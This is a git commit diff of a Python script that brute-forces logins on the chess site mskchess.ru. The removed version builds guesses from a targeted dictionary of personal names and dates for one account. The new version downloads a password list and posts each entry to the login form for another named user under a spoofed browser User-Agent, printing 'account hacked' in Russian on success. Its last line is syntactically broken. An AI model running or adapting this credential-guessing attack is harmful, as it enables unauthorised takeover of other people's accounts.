cdd6904ed014710a15d659e0a4b81f2715973b36
BorisiukIvan <121752518+BorisiukIvan@users.noreply.github.com>
2023-12-04 21:49:34 +0100

    Update log_mskchess.py

--- log_mskchess.py
+++ log_mskchess.py
@@ -1,25 +1,18 @@
-import requests, random
+import requests, time
 
 i = 0
-dictionary = ["24", "01", "2013", "_", "Efremov", "efremov", "Art", "art", "Don", "don", "chess", "Chess", "3", "qwerty", "12345678", "1234567890", "password", "Artem", "artem"]
-while 1:
-  password = ''
-  k = i
- # print(k)
-  while (k > 1):
-#        print(k%len(dictionary), k)
-        password = password + dictionary[k%len(dictionary)]
-        k = k // len(dictionary)
+dictionary = requests.get("https://raw.githubusercontent.com/BorisiukIvan/popular-passwords-list/main/listreal").text.split("\n")
+user = "MicroMouse"
+t1 = time.time()
+for password in dictionary:
   r = requests.post(
      "https://mskchess.ru/login",
-     {"username" : "Mskchess_YES", "password" : password},
+     {"username" : user, "password" : password},
      headers = {"User-Agent" : "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"},
-     #'446667c718540e5a9b16abe071fb06182afca0bf-sessionId=8J411kFdFxt8FUm8SEK94I&sid=2gvAoRqaunf6l3pna64iRx'
   )
   i = i + 1
-  print(r.status_code)
   if (r.status_code == 200):
-     print("!! Password: ", password)
+     print("АККАУНТ ВЗЛОМАН, ЛОГИН="+user+", ПАРОЛЬ="+password)
      break
-  print("CHECKED PASSWORD", password)
-  print(i, "passwords checked!")
+  t2 = time.time()
+  print((t2-t1)/(i+0.)+"секунд t2-t1+" секунд потрачено, "+i+" паролей проверено,"
